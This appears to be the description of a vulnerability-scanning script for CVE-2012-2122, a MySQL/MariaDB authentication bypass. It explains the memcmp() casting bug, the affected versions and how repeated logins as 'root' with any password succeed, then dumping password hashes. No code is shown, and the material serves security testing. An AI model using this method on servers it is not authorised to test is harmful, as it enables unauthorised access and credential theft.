Attempts to bypass authentication in MySQL and MariaDB servers by
exploiting CVE2012-2122. If its vulnerable, it will also attempt to
dump the MySQL usernames and password hashes.

All MariaDB and MySQL versions up to 5.1.61, 5.2.11, 5.3.5, 5.5.22 are
vulnerable but exploitation depends on whether memcmp() returns an
arbitrary integer outside of -128..127 range.

"When a user connects to MariaDB/MySQL, a token (SHA over a password
and a random scramble string) is calculated and compared with the
expected value. Because of incorrect casting, it might've happened
that the token and the expected value were considered equal, even if
the memcmp() returned a non-zero value. In this case MySQL/MariaDB
would think that the password is correct, even while it is not.
Because the protocol uses random strings, the probability of hitting
this bug is about 1/256.  Which means, if one knows a user name to
connect (and "root" almost always exists), she can connect using *any*
password by repeating connection attempts. ~300 attempts takes only a
fraction of second, so basically account password protection is as
good as nonexistent."
